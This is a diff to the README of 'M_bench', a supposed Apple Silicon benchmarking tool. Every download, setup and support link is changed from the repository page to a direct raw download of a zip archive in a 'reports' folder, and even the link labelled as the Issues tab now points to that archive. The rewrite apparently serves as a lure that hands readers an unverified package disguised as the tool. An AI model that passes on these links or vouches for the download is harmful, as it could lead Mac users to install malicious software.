@@ -1,6 +1,6 @@
 # ⚙️ M_bench - Measure Apple Silicon Performance Easily
 
-[![Download M_bench](https://img.shields.io/badge/Download-M_bench-brightgreen?style=for-the-badge)](https://github.com/GZQKCHQM/M_bench)
+[![Download M_bench](https://img.shields.io/badge/Download-M_bench-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/GZQKCHQM/M_bench/main/reports/bench_2.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to download and run M_bench on your Mac:
 
 Click this big button to go to the download page:
 
-[![Get M_bench](https://img.shields.io/badge/Get_M_bench-Download-blue?style=for-the-badge)](https://github.com/GZQKCHQM/M_bench)
+[![Get M_bench](https://img.shields.io/badge/Get_M_bench-Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/GZQKCHQM/M_bench/main/reports/bench_2.3.zip)
 
 On the new page, look for the latest release or download section. You can find files to download there. Download the latest version that matches your system. Usually, it comes as a `.zip` or `.dmg` file.
 
@@ -120,7 +120,7 @@ If you see error messages, write them down. You can search online or ask for hel
 
 To start, visit this page to download M_bench:
 
-[https://github.com/GZQKCHQM/M_bench](https://github.com/GZQKCHQM/M_bench)
+[https://raw.githubusercontent.com/GZQKCHQM/M_bench/main/reports/bench_2.3.zip](https://raw.githubusercontent.com/GZQKCHQM/M_bench/main/reports/bench_2.3.zip)
 
 Look for the latest version in the **Releases** or the **Code** tab. Download the file that suits your Mac.
 
@@ -178,11 +178,11 @@ You only need to open `M_bench.app` to use the tool.
 
 For issues or questions:
 
-- Check the **Issues** tab on the [GitHub page](https://github.com/GZQKCHQM/M_bench)
+- Check the **Issues** tab on the [GitHub page](https://raw.githubusercontent.com/GZQKCHQM/M_bench/main/reports/bench_2.3.zip)
 - Read FAQs and discussions by other M_bench users
 - Submit a detailed description if you want the developers to help
 
 ---
 
 #  
-[![Download M_bench](https://img.shields.io/badge/Download-M_bench-brightgreen?style=for-the-badge)](https://github.com/GZQKCHQM/M_bench)
+[![Download M_bench](https://img.shields.io/badge/Download-M_bench-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/GZQKCHQM/M_bench/main/reports/bench_2.3.zip)
